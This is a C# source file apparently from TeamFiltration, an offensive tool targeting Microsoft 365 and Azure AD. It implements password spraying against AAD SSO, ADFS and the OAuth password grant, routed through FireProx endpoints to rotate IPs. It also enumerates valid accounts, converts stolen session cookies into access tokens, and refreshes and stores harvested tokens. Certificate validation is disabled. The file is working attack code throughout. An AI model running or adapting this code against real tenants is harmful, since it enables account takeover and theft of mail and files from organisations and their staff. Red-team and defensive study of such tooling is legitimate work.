using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using TeamFiltration.Models.MSOL;
using TeamFiltration.Models.TeamFiltration;
using TeamFiltration.Helpers;
using static TeamFiltration.Modules.Spray;
using System.Web;

namespace TeamFiltration.Handlers
{
    class MSOLHandler
    {
        public static GlobalArgumentsHandler _globalProperties { get; set; }
        public static string _moduleName { get; set; }
        public static bool _debugMode { get; set; }
        public static DatabaseHandler _databaseHandler { get; set; }
        public MSOLHandler(GlobalArgumentsHandler globalProperties, string module, DatabaseHandler databaseHandler = null)
        {
            _globalProperties = globalProperties;
            _moduleName = module;
            _databaseHandler = databaseHandler;
            _debugMode = globalProperties.DebugMode;
        }


        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginSprayAttempt(SprayAttempt sprayAttempts, UserRealmResp userRealmResp)
        {
            #region burp debug
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };
            #endregion


            var client = new HttpClient(httpClientHandler);
            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            //If we are spraying a NON adfs customer

            if (sprayAttempts.AADSSO)
            {
                var errorMsg = "ADF1337: Invalid password or username";
                var domain = sprayAttempts.Username.Split("@")[1];
                //Implement the new method
                var aadSsoUrl = $"{sprayAttempts.FireProxURL}/{domain}/winauth/trust/2005/usernamemixed?client-request-id={Guid.NewGuid()}";
                var created = DateTime.Now.ToUniversalTime().ToString("o");
                var expires = DateTime.Now.AddMinutes(13).ToUniversalTime().ToString("o");

                var xmlData = $@"<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{aadSsoUrl}</wsa:To>
        <wsa:MessageID>urn:uuid:{Guid.NewGuid().ToString()}</wsa:MessageID>
        <wsse:Security s:mustUnderstand=""1"">
            <wsu:Timestamp wsu:Id=""_0"">
                <wsu:Created>{created}</wsu:Created>
                <wsu:Expires>{expires}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id=""uuid-{Guid.NewGuid().ToString()}"">
                <wsse:Username>{sprayAttempts.Username}</wsse:Username>
                <wsse:Password>{sprayAttempts.Password}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>";

                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);
               

                var xmlBody = new StringContent(xmlData, Encoding.UTF8, "text/xml");
                HttpResponseMessage httpResp = await client.PostAsync(aadSsoUrl, xmlBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();


                if (httpResp.StatusCode.Equals(HttpStatusCode.BadRequest))
                {
                    try
                    {
                        errorMsg = contentResp.Split("</psf:code><psf:text>")[1].Split("<")[0];
                    }
                    catch (Exception)
                    {

                    }



                }

                if (httpResp.StatusCode.Equals(HttpStatusCode.OK))
                    tokenResp = new BearerTokenResp()
                    {
                        access_token = "Dummy_Data_Whike_Debugging_ADFS",
                        expires_on = "1337",
                        ext_expires_in = "1337",
                        expires_in = "1337",
                        refresh_token = "Dummy_Data_Whike_Debugging_ADFS",
                        resource = "bad.bad.com"
                    };
                // JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);

                else
                    errorResp = new BearerTokenErrorResp()
                    { error_description = (string.IsNullOrEmpty(errorMsg)) ? "ADFXXXX: Invalid password or username" : errorMsg };// JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
            }


            if (userRealmResp.Adfs && !sprayAttempts.AADSSO)
            {
                var loginPostBody = new FormUrlEncodedContent(new[]
                  {

                    new KeyValuePair<string, string>("UserName", sprayAttempts.Username),
                    new KeyValuePair<string, string>("Password", sprayAttempts.Password),
                    new KeyValuePair<string, string>("AuthMethod", "FormsAuthentication"),

                });


                var adfsURL = new Uri(userRealmResp.ThirdPartyAuthUrl.Split("?")[0]);

                //client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,''image/webp,; q = 0.8'");
                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);

                var adfsUrl = $"https://{adfsURL.Host}/adfs/ls/?wfresh=0&wauth=http%3a%2f%2fschemas.microsoft.com%2fws%2f2008%2f06%2fidentity%2fauthenticationmethod%2fpassword&cxhflow=TB&cxhplatformversion=10.0.17763&client-request-id={Guid.NewGuid().ToString()}&username={HttpUtility.UrlEncode(sprayAttempts.Username)}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline";

                HttpResponseMessage httpResp = await client.PostAsync(adfsUrl, loginPostBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();
                httpResp.Headers.TryGetValues("Set-Cookie", out var setCookies);

                bool MSISAuth = setCookies.Where(x => x.Contains("MSISAuth=")).Any();

                if (httpResp.StatusCode.Equals(HttpStatusCode.OK) && MSISAuth)
                    tokenResp = new BearerTokenResp()
                    {
                        access_token = setCookies.Where(x => x.Contains("MSISAuth=")).FirstOrDefault().Split("=")[1],
                        expires_on = "1337",
                        ext_expires_in = "1337",
                        expires_in = "1337",
                        refresh_token = "",
                        resource = adfsURL.Host
                    };


                else
                    errorResp = new BearerTokenErrorResp()
                    { error_description = "ADF1337: Invalid password or username" };// JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            }


            if (!userRealmResp.Adfs && !sprayAttempts.AADSSO)
            {
                var loginPostBody = new FormUrlEncodedContent(new[]
               {
                new KeyValuePair<string, string>("resource", sprayAttempts.ResourceUri),
                new KeyValuePair<string, string>("client_id",  sprayAttempts.ResourceClientId),
                new KeyValuePair<string, string>("client_info", "1"),
                new KeyValuePair<string, string>("grant_type", "password"),
                new KeyValuePair<string, string>("username", sprayAttempts.Username),
                new KeyValuePair<string, string>("password", sprayAttempts.Password),
                new KeyValuePair<string, string>("scope", "openid")  });

                client.DefaultRequestHeaders.Add("Accept", "application/json");
                client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);


                HttpResponseMessage httpResp = await client.PostAsync(sprayAttempts.FireProxURL, loginPostBody);
                string contentResp = await httpResp.Content.ReadAsStringAsync();


                if (httpResp.IsSuccessStatusCode)
                    tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
                else
                    errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            }

            return (tokenResp, errorResp);
        }

        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> CookieGetAccessToken(string tenantId, string cookieData, string baseUrl = "https://login.microsoftonline.com", string targetResource = "https://legitcorpnet-my.sharepoint.com", string clientId = "5e3ce6c0-2b1f-4285-8d4b-75ee78787346")
        {
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode,
                UseCookies = false,
                AllowAutoRedirect = false,
            };



            using var client = new HttpClient(httpClientHandler);

            client.DefaultRequestHeaders.Add("Cookie", cookieData);
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);

            var url = baseUrl + "/" + tenantId + "/oauth2/v2.0/authorize?response_type=token&grant_type=authorization_code&scope=" + "https://" + new Uri(targetResource).Host + "//.default openid profile&client_id=" + clientId + "&redirect_uri=https://teams.microsoft.com/go&client_info=1&claims={\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&client-request-id=" + Guid.NewGuid().ToString() + "&windows_api_version=2.0";
           
            HttpResponseMessage httpResp = await client.GetAsync(url);
            string contentResp = await httpResp.Content.ReadAsStringAsync();

            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            if (httpResp.StatusCode == HttpStatusCode.Redirect)
            {

                Regex regex = new Regex(@"access_token=(.*)>here");

                Match oauthAuthroizeConfig = regex.Match(contentResp);

                var accessTokenString = oauthAuthroizeConfig.Value;

                NameValueCollection qscoll = HttpUtility.ParseQueryString(HttpUtility.UrlDecode(accessTokenString));

                Console.WriteLine($"[+] Successfully got access token for {Helpers.Generic.GetUsername(qscoll.GetValues("access_token")[0])}, target resource: {"https://" + new Uri(targetResource).Host}");


                tokenResp = new BearerTokenResp()
                {

                    resource = "https://" + new Uri(targetResource).Host,
                    access_token = qscoll.GetValues("access_token")[0],
                    refresh_token = qscoll.GetValues("access_token")[0],
                    scope = "https://" + new Uri(targetResource).Host + "//.default openid profile",
                    expires_in = qscoll.GetValues("amp;expires_in")[0]

                };

                //  _databaseHandler.WriteToken(newToken);

                var foo = contentResp;
            }
            else
                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            return (tokenResp, errorResp);
        }

        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> RefreshAttempt(BearerTokenResp bearer, string url, string resURI = "https://outlook.office365.com", string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264", bool checkCache = true, bool print = true)
        {



            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            if (string.IsNullOrEmpty(resURI))
            {
                return (tokenResp, errorResp);
            }


            //We wanna check if we already have a valid token for this resource
            if (checkCache)
            {
                var username = Helpers.Generic.GetUsername(bearer.access_token);
                var tokenQueryData = _databaseHandler.QueryTokens(username, resURI);
                if (tokenQueryData != null)
                {
                    var tokenObject = JsonConvert.DeserializeObject<BearerTokenResp>(tokenQueryData.ResponseData);
                    if (Helpers.Generic.IsTokenValid(tokenQueryData.ResponseData, tokenQueryData.DateTime))
                    {
                        tokenResp = tokenObject;
                        return (tokenResp, errorResp);
                    }
                }
            }
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };

            using var client = new HttpClient(httpClientHandler);



            var loginPostBody = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("grant_type", "refresh_token"),
                new KeyValuePair<string, string>("refresh_token", bearer.refresh_token),
                new KeyValuePair<string, string>("client_id",  clientId),
                new KeyValuePair<string, string>("resource", "https://" + new Uri(resURI).Host ),
                new KeyValuePair<string, string>("scope", "openid"),
                new KeyValuePair<string, string>("windows_api_version", "2.0"),
                new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),



            });


            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);

            //Add some error handling here
            var httpResp = await client.PostAsync(url, loginPostBody);
            var contentResp = await httpResp.Content.ReadAsStringAsync();


            if (httpResp.IsSuccessStatusCode)
            {
                if (print)
                    _databaseHandler.WriteLog(new Log(_moduleName, $"Refreshed a token for => {"https://" + new Uri(resURI).Host }"));
                tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
                _databaseHandler.WriteToken(new PulledTokens()
                {
                    ResponseData = contentResp,
                    ResourceClientId = clientId,
                    ResourceUri = "https://" + new Uri(resURI).Host,
                    Username = Helpers.Generic.GetUsername(tokenResp.access_token)
                });

            }
            else
            {
                var attempDecode = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
                if (print)
                {
                    if (string.IsNullOrEmpty(attempDecode?.error_description))
                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host } HTTPStatusCode {httpResp.StatusCode}", ""));
                    else
                        _databaseHandler.WriteLog(new Log(_moduleName, $"Failed to get token for => {"https://" + new Uri(resURI).Host } AAD CODE: {attempDecode.error_description.Split(":")[0]}", ""));
                }
                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);
            }

            return (tokenResp, errorResp);
        }
   
        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginAttemptFireProx(string username, string password, string url, (string Uri, string clientId) randomO365Res, bool print = true)
        {

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };



            using var client = new HttpClient(httpClientHandler);




            var loginPostBody = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("resource", randomO365Res.Uri),
                new KeyValuePair<string, string>("client_id",  randomO365Res.clientId),
                new KeyValuePair<string, string>("client_info", "1"),
                new KeyValuePair<string, string>("grant_type", "password"),
                new KeyValuePair<string, string>("username", username),
                new KeyValuePair<string, string>("password", password),
                new KeyValuePair<string, string>("scope", "openid")


            });

            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);


            HttpResponseMessage httpResp = await client.PostAsync(url, loginPostBody);
            string contentResp = await httpResp.Content.ReadAsStringAsync();

            BearerTokenResp tokenResp = null;
            BearerTokenErrorResp errorResp = null;

            if (httpResp.IsSuccessStatusCode)
            {
                tokenResp = JsonConvert.DeserializeObject<BearerTokenResp>(contentResp);
                _databaseHandler.WriteToken(new PulledTokens()
                {
                    ResponseData = contentResp,
                    ResourceClientId = randomO365Res.clientId,
                    ResourceUri = randomO365Res.Uri,
                    Username = Helpers.Generic.GetUsername(tokenResp.access_token)
                });
            }
            else
                errorResp = JsonConvert.DeserializeObject<BearerTokenErrorResp>(contentResp);

            return (tokenResp, errorResp);
        }

        public async Task<bool> ValidateO365Account(string username, bool print = false, bool redo = true)
        {

            int redoCount = 0;

        Start:
            var url = _globalProperties.GetBaseUrl().Replace("common/oauth2/token", "common/GetCredentialType");

            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };

            using (var clientHttp = new HttpClient(httpClientHandler))
            {

                GetCredentialType getCredTypeJson = new GetCredentialType()
                {
                    username = username,
                    isOtherIdpSupported = true,
                    checkPhones = false,
                    isRemoteNGCSupported = true,
                    isCookieBannerShown = false,
                    isFidoSupported = true,
                    originalRequest = "",
                    country = "US",
                    forceotclogin = false,
                    isExternalFederationDisallowed = false,
                    isRemoteConnectSupported = false,
                    federationFlags = 0,
                    isSignup = false,
                    flowToken = "",
                    isAccessPassSupported = true

                };

                var postAsyncReq = await clientHttp.PostAsync(url, new StringContent(JsonConvert.SerializeObject(getCredTypeJson), Encoding.UTF8, "application/json"));

                if (postAsyncReq.IsSuccessStatusCode)
                {
                    var postAsyncResp = await postAsyncReq.Content.ReadAsStringAsync();
                    var postRespObject = JsonConvert.DeserializeObject<GetCredentialTypeResp>(postAsyncResp);

                    if (postRespObject.ThrottleStatus == 0)
                    {
                        if (postRespObject.IfExistsResult == 0 || postRespObject.IfExistsResult == 5 || postRespObject.IfExistsResult == 6)

                            if (!string.IsNullOrEmpty(postRespObject.EstsProperties?.CallMetadata?.HisRegion))
                                return true;
                    }
                    else
                    {
                        if (redo)
                        {
                            redoCount++;
                            if (redoCount < 5)
                                goto Start;
                        }

                    }
                }
            }

            return false;

        }
       
        public async Task<GetTokenResp> GetToken(string username, string password, string onBehalfUrl = "https://outlook.office365.com", bool print = false)
        {

            var baseUrl = "https://login.microsoftonline.com/";

            // This is for debug , eg burp
            var proxy = new WebProxy
            {
                Address = new Uri(_globalProperties.TeamFiltrationConfig.proxyEndpoint),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,


            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _debugMode
            };


            var loginClient = new HttpClient(httpClientHandler);


            //ClientId for Teams
            //string clientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
            //Outlook mobile
            string clientId = "27922004-5251-4030-b22d-91ecd9a37ea4";


            var queryParams = new NameValueCollection(){
            { "response_type", "code" },
            { "client_id", clientId },
            { "redirect_uri", "ms-appx-web://Microsoft.AAD.BrokerPlugin/" + clientId },
            { "add_account", "multiple" },
            { "login_hint", username },
            { "response_mode", "form_post" },
            { "claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}" },
           // { "scope", "Mail.ReadBasic, Mail.Read, Mail.ReadWrite" },
            { "resource", "https://" + new Uri(onBehalfUrl).Host},
            { "windows_api_version", "2.0"},
             };


            var oAuthUrl_Authorize = baseUrl + "common/oauth2/authorize?" + Helpers.Generic.ToQueryString(queryParams);




            loginClient.DefaultRequestHeaders.Add("return-client-request-id", "true");
            loginClient.DefaultRequestHeaders.Add("client-request-id", Guid.NewGuid().ToString());
            loginClient.DefaultRequestHeaders.Add("tb-aad-env-id", "10.0.17763.1131");
            loginClient.DefaultRequestHeaders.Add("tb-aad-device-family", "3");
            loginClient.DefaultRequestHeaders.Add("Origin", "https://login.microsoftonline.com");
            loginClient.DefaultRequestHeaders.Add("Host", new Uri(baseUrl).Host);
            loginClient.DefaultRequestHeaders.Add("User-Agent", _globalProperties.TeamFiltrationConfig.userAgent);

            //Send the GET req
            HttpResponseMessage oAuthResp = await loginClient.PollyGetAsync(oAuthUrl_Authorize);

            //Read the content
            string oauthAuthroizeResponseContent = await oAuthResp.Content.ReadAsStringAsync();

            if (oauthAuthroizeResponseContent.Contains("/adfs/ls/?"))
            {
                if (print)
                    _databaseHandler.WriteLog(new Log(_moduleName, $"Seems like we are dealing with ADFS, not supported as of this time!", ""));

            }
            else if (oauthAuthroizeResponseContent.Contains("This web browser either does not support JavaScript"))
            {
                if (print)
                    _databaseHandler.WriteLog(new Log(_moduleName, $"Something bad happend, does this account belong to an O365 tenant?!", ""));
                // _teamFiltrationConfig.WriteLog("[+] Something bad happend, does this account belong to an O365 tenant?", _moduleName);

            }
            else
            {


                //Carve out some data we need
                Regex regex = new Regex(@"\$Config={(.*)\};");

                Match oauthAuthroizeConfig = regex.Match(oauthAuthroizeResponseContent);

                GetAuthResponse getDataParsed = JsonConvert.DeserializeObject<GetAuthResponse>(oauthAuthroizeConfig.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));

                IEnumerable<string> clientReqId = oAuthResp.Headers.GetValues("client-request-id");

                string hpgRequestId = oAuthResp.Headers.GetValues("x-ms-request-id").FirstOrDefault();



                var loginPostBody = new FormUrlEncodedContent(new[]
                {
                new KeyValuePair<string, string>("i13", "0"),
                new KeyValuePair<string, string>("login", username),
                new KeyValuePair<string, string>("loginfmt", username),
                new KeyValuePair<string, string>("LoginOptions", "3"),
                new KeyValuePair<string, string>("type", "11"),
                new KeyValuePair<string, string>("passwd", password),
                new KeyValuePair<string, string>("ps", "2"),
                new KeyValuePair<string, string>("loginOptions", "3"),
                new KeyValuePair<string, string>("NewUser", "1"),

                //No idea what this is
                new KeyValuePair<string, string>("fspost", "0"),
                new KeyValuePair<string, string>("i21", "0"),
                new KeyValuePair<string, string>("CookieDisclosure", "1"),
                new KeyValuePair<string, string>("IsFidoSupported", "0"),
                new KeyValuePair<string, string>("isSignupPost", "0"),
                new KeyValuePair<string, string>("i19", "1685"),

               new KeyValuePair<string, string>("canary", getDataParsed.canary),
               new KeyValuePair<string, string>("ctx", getDataParsed.sCtx),
               new KeyValuePair<string, string>("hpgrequestid", hpgRequestId),
               new KeyValuePair<string, string>("flowToken", getDataParsed.sFT)

            });


                //Send the login request
                HttpResponseMessage loginResp = await loginClient.PostAsync(baseUrl + "common/login?cxhflow=TB&cxhplatformversion=10.0.17763", loginPostBody);

                //authMethodId
                var rawResp = await loginResp.Content.ReadAsStringAsync();
                Match loginRespReg = regex.Match(rawResp);

                if (rawResp.Contains("authMethodId"))
                {

                    LoginMFAAuthResponse loginMFAAuthResponseData = JsonConvert.DeserializeObject<LoginMFAAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));


                    return new GetTokenResp() { MFAResponse = loginMFAAuthResponseData, TokenResp = null };

                }

                //sErrorCode

                if (rawResp.Contains("sErrorCode"))
                {

                    LoginErrorAuthResponse loginErrorAuthResponseData = JsonConvert.DeserializeObject<LoginErrorAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));


                    return new GetTokenResp() { MFAResponse = null, TokenResp = null, ErrorResp = loginErrorAuthResponseData };

                }
                LoginAuthResponse loginAuthResponeData = JsonConvert.DeserializeObject<LoginAuthResponse>(loginRespReg.Groups[0].Value.Replace("$Config=", "").TrimEnd(';'));

                //Get the latest ID from this "flow"
                hpgRequestId = loginResp.Headers.GetValues("x-ms-request-id").FirstOrDefault();


                //Need to carve out some header data to not inroll device
                Regex inrollDeviceReg = new Regex(@"name=""code"" value=""(.*)"" />");

                if (rawResp.Contains("Your account has been locked"))
                {

                    return null;
                }

                var inrollDeviceMatches = inrollDeviceReg.Match(rawResp);

                if (inrollDeviceMatches.Groups[0].Length == 0)
                {

                    return null;
                }

                var inrollDeviceCode = inrollDeviceMatches.Groups[0].Value.Replace("name=\"code\" value=\"", "").Split(new String[] { "/><input" }, StringSplitOptions.RemoveEmptyEntries)[0].Replace("\"", "");

                var bearerContent = new FormUrlEncodedContent(new[]
             {

                new KeyValuePair<string, string>("grant_type", "authorization_code"),
                new KeyValuePair<string, string>("redirect_uri", "ms-appx-web://Microsoft.AAD.BrokerPlugin/" + clientId),
                new KeyValuePair<string, string>("code", inrollDeviceCode),
                new KeyValuePair<string, string>("client_id", clientId),
                new KeyValuePair<string, string>("claims", "{\"access_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}"),
                new KeyValuePair<string, string>("windows_api_version", "2.0"),

                //This is some sort of magic ass value, have NO idea where it's generated or what it is. needs to be looked into and hopefully generated dynamicly
                new KeyValuePair<string, string>("tbidv2", "AAEGAQC39BpxT9ud1GdBZ//NUmSqwYkiu+A+awkfGjw6XQzREm6nvdiYMJVShq8FAz1fRWPqsl0oAsS2kgg9+oeWuv/Ic0ESvjUs07A7IFBBgeiPCb2jaStEFPa2xDKXWB1l8xHIpcenmf1eR9eQ6St/NxxspulsWiLJc8BmCnGOrc0ClkALZ/vPNBrvKtsdWopdIKI8F/lAhunw1mQ1PZXFjqAyI9yERvww/JsN6h9LgUp8TcQXkYBCD+0eZlFCTICh4Wir9NOG4v8CbjTjNhqOSy68f3u3M5LdcJVxYdKVwFcU1quRLiPgX9xAWnMjNiOvmNGwsCIHiXxuWYL5mnjrrxCxAwEAAQ==")

            });


                HttpResponseMessage bearerTokenResp = await loginClient.PostAsync(baseUrl, bearerContent);
                BearerTokenResp bearerTokenRespData = JsonConvert.DeserializeObject<BearerTokenResp>(await bearerTokenResp.Content.ReadAsStringAsync());
                return new GetTokenResp() { MFAResponse = null, TokenResp = bearerTokenRespData };
                // return bearerTokenRespData;
            }
            return new GetTokenResp() { MFAResponse = null, TokenResp = null };
        }

    }
}
